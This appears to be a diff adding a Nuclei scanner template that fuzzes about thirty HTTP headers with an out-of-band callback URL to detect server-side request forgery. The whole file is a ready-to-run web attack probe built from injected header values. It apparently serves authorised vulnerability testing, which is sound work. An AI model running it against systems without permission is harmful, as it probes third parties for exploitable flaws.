@@ -1,0 +1,48 @@
+id: ssrf_headers
+info:
+  name: ssrf_headers
+  author: raff
+  severity: high
+  description: Fuzzing 
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Referer:{{interactsh-url}}
+        User-Agent: {{interactsh-url}}
+        Cookie: {{interactsh-url}}
+        Authorization: {{interactsh-url}}
+        Forwarded: {{interactsh-url}}
+        X-Forwarded-For: {{interactsh-url}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-Proto: {{interactsh-url}}
+        X-Original-URL: {{interactsh-url}}
+        X-Rewrite-URL: {{interactsh-url}}
+        X-Host: {{interactsh-url}}
+        X-Remote-IP: {{interactsh-url}}
+        X-Remote-Addr: {{interactsh-url}}
+        X-Client-IP: {{interactsh-url}}
+        X-Client-Forwarded-For: {{interactsh-url}}
+        X-True-IP: {{interactsh-url}}
+        X-Original-Forwarded-For: {{interactsh-url}}
+        X-Originating-IP: {{interactsh-url}}
+        X-Target-URL: {{interactsh-url}}
+        X-Redirect: {{interactsh-url}}
+        X-Proxy-URL: {{interactsh-url}}
+        X-Proxy: {{interactsh-url}}
+        X-URL: {{interactsh-url}}
+        X-Forward: {{interactsh-url}}
+        X-Forwarded-Server: {{interactsh-url}}
+        X-Request-URL: {{interactsh-url}}
+        X-Original-URL: {{interactsh-url}}
+        X-Proxy-Host: {{interactsh-url}}
+        X-URL-Map: {{interactsh-url}}
+        X-Path: {{interactsh-url}}
+        X-Forwarded-Path: {{interactsh-url}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
